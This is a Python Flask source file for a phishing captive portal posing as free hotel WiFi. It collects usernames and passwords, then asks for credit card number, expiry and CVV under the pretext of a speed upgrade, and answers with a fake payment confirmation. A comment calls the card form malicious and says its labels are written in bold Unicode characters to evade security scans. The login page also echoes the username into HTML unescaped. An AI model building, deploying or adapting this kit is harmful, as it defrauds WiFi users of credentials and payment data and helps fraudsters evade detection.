from flask import Flask, request
from ui import stylish_ui

app = Flask(__name__)

@app.route('/')
def home():
    # login form
    content = '''
    <h2>👑 Royal Hotel Free WiFi</h2>
    <form action="/login" method="post">
        Username: <input type="text" name="username"><br><br>
        Password: <input type="text" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
    '''
    return stylish_ui(content)

@app.route('/login', methods=['POST'])
def login():
    # Malicious credit card infromation form
    # Sensitive fields are written as bold Unicode characters to bypass security scans 
    user = request.form.get('username')
    content = f'''
        <p>
            Successfully logged in as <b>{user}</b>!    
        <p>
        <hr>
        <h2>👑 High Speed Royal Hotel WiFi</h2>
        <p>
            Upgrade to 1 Gbps WiFi for $2 USD per day!
        </p>
        <hr>
        <br>
        <form action="/pay" method="post">
            𝗖𝗿𝗲𝗱𝗶𝘁 𝗖𝗮𝗿𝗱 𝗡𝘂𝗺𝗯𝗲𝗿: <input type="text" name="credit_n"><br><br>
            𝐄𝐱𝐩 (mm/yy): <input type="text" name="exp"><br><br>
            𝗖𝗩𝗩: <input type="text" name="cvv"><br><br>
            <input type="submit" value="Upgrade">
        </form>
        '''
    return stylish_ui(content)

@app.route('/pay', methods=['POST'])
def pay():
    # form submission notice
    content = "<p>Payment was successfly processed, you can now browse at 1 Gbps!</p>"
    return stylish_ui(content)
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)